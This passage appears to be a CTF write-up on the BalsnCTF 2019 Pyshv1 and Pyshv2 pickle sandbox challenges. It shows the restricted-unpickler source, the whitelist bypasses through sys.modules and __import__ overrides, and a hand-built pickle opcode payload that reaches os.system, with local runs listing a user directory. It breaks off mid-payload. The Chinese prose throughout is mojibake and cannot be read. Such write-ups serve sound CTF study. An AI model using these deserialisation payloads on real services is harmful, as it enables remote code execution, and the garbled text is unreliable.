Python 3.7.4ï¼Œååºåˆ—åŒ–æ—¶è·å–åˆ°çš„ <code>builtins</code> æ˜¯ä¸€ä¸ª <code>dict</code>ï¼Œæ‰€ä»¥ç”¨äº†ä¸¤æ¬¡ <code>get</code>ï¼Œè§†ç¯å¢ƒè¿›è¡Œè°ƒæ•´å§ã€‚è¿™ä¸ª payload åœ¨ Python 3.7.3 åˆè·‘ä¸èµ·æ¥ ï¼šï¼‰</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><blockquote><p>ç¯å¢ƒï¼š <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'sys'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº†å¯¼å…¥çš„æ¨¡å—åªèƒ½æ˜¯ <code>sys</code>ï¼Œé—®é¢˜æ˜¯è¿™ä¸ªæ¨¡å—ä¹Ÿä¸å®‰å…¨å‘€ ï¼šï¼‰</p><blockquote><p><code>sys.modules</code></p><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail.</p></blockquote><p>å¦‚æœ Python æ˜¯åˆšå¯åŠ¨çš„è¯ï¼Œæ‰€åˆ—å‡ºçš„æ¨¡å—å°±æ˜¯è§£é‡Šå™¨åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„æ¨¡å—ã€‚æœ‰äº›åº“æ˜¯é»˜è®¤è¢«åŠ è½½è¿›æ¥çš„ï¼Œä¾‹å¦‚ <code>os</code>ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼ŒåŸå› åœ¨äº sys.modules ä¸­æœªç» import åŠ è½½çš„æ¨¡å—å¯¹å½“å‰ç©ºé—´æ˜¯ä¸å¯è§çš„ã€‚ </p><p>è¿™é‡Œçš„ <code>find_class</code> ç›´æ¥è°ƒçš„ pickle.py ä¸­çš„æ–¹æ³•ï¼Œé‚£å°±å…ˆçœ‹çœ‹å®ƒå¦‚ä½•å¯¼å…¥åŒ…çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    __import__(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>sys.modules</code> ä¸ºï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'sys': &lt; module 'sys'(built - in ) &gt; ,</span><br><span class="line">    'builtins': &lt; module 'builtins'(built - in ) &gt; ,</span><br><span class="line">    'os': &lt; module 'os'</span><br><span class="line">    from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬çš„ç›®æ ‡ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; getattr(sys.modules['os'], 'system')</span><br></pre></td></tr></table></figure><p>é™åˆ¶äº† module åªèƒ½ä¸º sysï¼Œé‚£èƒ½å¦æŠŠ <code>sys.modules[&#39;sys&#39;]</code>æ›¿æ¢ä¸º<code>sys.modules[&#39;os&#39;]</code>ï¼Œä»è€Œå¼•å…¥å±é™©æ¨¡å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å®éªŒä¸€ä¸‹ï¼ŒæˆåŠŸï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">20</span>:<span class="number">34</span>:<span class="number">20</span>) [MSC v.<span class="number">1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from sys import modules</span><br><span class="line">&gt;&gt;&gt; modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line">&gt;&gt;&gt; from sys import system</span><br><span class="line">&gt;&gt;&gt; system(<span class="string">'dir'</span>)</span><br><span class="line"> é©±åŠ¨å™¨ C ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚</span><br><span class="line"> å·çš„åºåˆ—å·æ˜¯ F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj çš„ç›®å½•</span><br><span class="line"></span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2019</span>/<span class="number">08</span>/<span class="number">22</span>  <span class="number">21</span>:<span class="number">02</span>             <span class="number">2</span>,<span class="number">750</span> <span class="selector-class">.aggressor</span><span class="selector-class">.prop</span></span><br><span class="line"><span class="number">2019</span>/<span class="number">09</span>/<span class="number">16</span>  <span class="number">00</span>:<span class="number">09</span>    &lt;DIR&gt;          .anaconda</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">09</span>  <span class="number">13</span>:<span class="number">58</span>    &lt;DIR&gt;          .android</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">13</span>  <span class="number">14</span>:<span class="number">37</span>    &lt;DIR&gt;          .astropy</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>            <span class="number">18</span>,<span class="number">465</span> .bash_history</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">07</span>  <span class="number">12</span>:<span class="number">03</span>    &lt;DIR&gt;          <span class="selector-class">.CLion2019</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ªå°éº»çƒ¦ï¼Œ<code>modules</code> æ˜¯ä¸ª <code>dict</code>ï¼Œæ— æ³•ç›´æ¥å–å€¼ã€‚ç»§ç»­åˆ©ç”¨ <code>getattr(sys.modules[module], name)</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'sys'</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  <span class="comment"># æˆåŠŸå¯¼å…¥ dict å¯¹è±¡</span></span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'clear'</span>, <span class="string">'copy'</span>, <span class="string">'fromkeys'</span>, <span class="string">'get'</span>, <span class="string">'items'</span>, <span class="string">'keys'</span>, <span class="string">'pop'</span>, <span class="string">'popitem'</span>, <span class="string">'setdefault'</span>, <span class="string">'update'</span>, <span class="string">'values'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(sys, <span class="string">'get'</span>)  <span class="comment"># ç»“åˆ find_class ä¸­çš„ getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of dict object at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure><p>æ”¹å†™æˆ pickleï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S<span class="string">'sys'</span></span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line"><span class="built_in">get</span></span><br><span class="line">(S<span class="string">'os'</span></span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>S<span class="string">'sys'</span></span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line"><span class="keyword">system</span></span><br><span class="line">(S<span class="string">'dir'</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><blockquote><p>ç¯å¢ƒï¼š <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        module = __import__(module)</span><br><span class="line">        <span class="keyword">return</span> getattr(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py ä¸ºç©º</span></span><br></pre></td></tr></table></figure><p>çœŸä¼šç©ï¼Œç»™ä½ ä¸€ä¸ªç©ºæ¨¡å—ï¼šï¼‰ï¼Œå…ˆçœ‹ä¸‹ç©ºæ¨¡å—æœ‰å“ªäº›å†…ç½®æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = __import__(<span class="string">'structs'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">'structs'</span> <span class="keyword">from</span> <span class="string">'C:\\Users\\wywwzjj\\structs.py'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(structs)</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__builtins__'</span>)[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œé—®é¢˜åˆè½¬å˜ä¸ºå¦‚ä½•è·å–é”®å€¼ï¼Œè¿˜æ˜¯æ¯”è¾ƒè‰°éš¾ã€‚</p><p>æŸ¥æ–‡æ¡£æ—¶åˆå‘ç°äº†ä¸€ä¸ªä¸œè¥¿ï¼ŒåŸæ¥ <code>__import__</code> å¯è¢«è¦†ç›–ã€‚</p><blockquote><p><code>__import__</code>(<em>name</em>, <em>globals=None</em>, <em>locals=None</em>, <em>fromlist=()</em>, <em>level=0</em>)</p><p>æ­¤å‡½æ•°ä¼šç”± <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> è¯­å¥å‘èµ·è°ƒç”¨ã€‚ å®ƒå¯ä»¥è¢«æ›¿æ¢ (é€šè¿‡å¯¼å…¥ <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> æ¨¡å—å¹¶èµ‹å€¼ç»™ <code>builtins.__import__</code>) ä»¥ä¾¿ä¿®æ”¹ <code>import</code> è¯­å¥çš„è¯­ä¹‰ï¼Œä½†æ˜¯ <strong>å¼ºçƒˆ</strong> ä¸å»ºè®®è¿™æ ·åšï¼Œå› ä¸ºä½¿ç”¨å¯¼å…¥é’©å­ (å‚è§ <a href="https://www.python.org/dev/peps/pep-0302" target="_blank" rel="noopener"><strong>PEP 302</strong></a>) é€šå¸¸æ›´å®¹æ˜“å®ç°åŒæ ·çš„ç›®æ ‡ï¼Œå¹¶ä¸”ä¸ä¼šå¯¼è‡´ä»£ç é—®é¢˜ï¼Œå› ä¸ºè®¸å¤šä»£ç éƒ½ä¼šå‡å®šæ‰€ç”¨çš„æ˜¯é»˜è®¤å®ç°ã€‚ åŒæ ·ä¹Ÿä¸å»ºè®®ç›´æ¥ä½¿ç”¨ <a href="https://docs.python.org/zh-cn/3/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a> è€Œåº”è¯¥ç”¨ <a href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module" target="_blank" rel="noopener"><code>importlib.import_module()</code></a>ã€‚</p></blockquote><p>é‚£è¯¥è¦†ç›–æˆä»€ä¹ˆå‡½æ•°å‘¢ï¼Ÿæœ€å¥½æ˜¯ <code>__import__(module)</code> åèƒ½è¿”å›å­—å…¸çš„å‡½æ•°ã€‚</p><p>åªèƒ½ä»å†…ç½®å‡½æ•°ä¸‹æ‰‹äº†ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å§ï¼Œå‘ç°æ²¡ä¸€ä¸ªèƒ½ç”¨çš„ã€‚</p><p>åæ¥åˆæƒ³èµ·è¿˜æœ‰ä¸€å †é­”æœ¯æ–¹æ³•æ²¡æœ‰è¯•ï¼Œåˆæ˜¯ä¸€ç¯‡å¹¿é˜”çš„å¤©åœ°ã€‚</p><p><a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g802k3rxitj20gz0p0q4f.jpg" alt="image.png"></p><p>è¿™ä¸ª <code>__getattribute__</code> æ°å¥½èƒ½ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼ŒçœŸæ£’ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__getattribute__'</span>)(<span class="string">'__builtins__'</span>)</span><br><span class="line">&#123;'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;),...</span><br></pre></td></tr></table></figure><p>å†ç†ä¸‹æ€è·¯ï¼šï¼ˆä¼ªä»£ç ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = getattr(structs, <span class="string">'__builtins__'</span>)   <span class="comment"># è·å–åˆ°å­—å…¸ï¼Œå…ˆå­˜èµ·æ¥</span></span><br><span class="line">getattr(structs, <span class="string">'__import__'</span>) = getattr(structs, <span class="string">'__getattribute__'</span>)  <span class="comment"># è¦†ç›– __import__</span></span><br><span class="line">setattr(structs, <span class="string">'structs'</span>, d)   <span class="comment"># åˆ›å»ºä¸ª structs çš„å±æ€§ï¼Œå­—å…¸å†™å…¥è¯¥å±æ€§</span></span><br><span class="line">mo = __import__(structs) <span class="comment"># æ­¤æ—¶çš„ mo å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ __builtins__</span></span><br><span class="line">getattr(mo, <span class="string">'get'</span>)     <span class="comment"># è·å–åˆ° get æ–¹æ³•ï¼Œç„¶åå°±å¯ä»¥æŒ‰ç…§ pyshv1 çš„æ€è·¯æ¥äº†</span></span><br></pre></td></tr></table></figure><p>è½¬æ¢ä¸º pickleï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 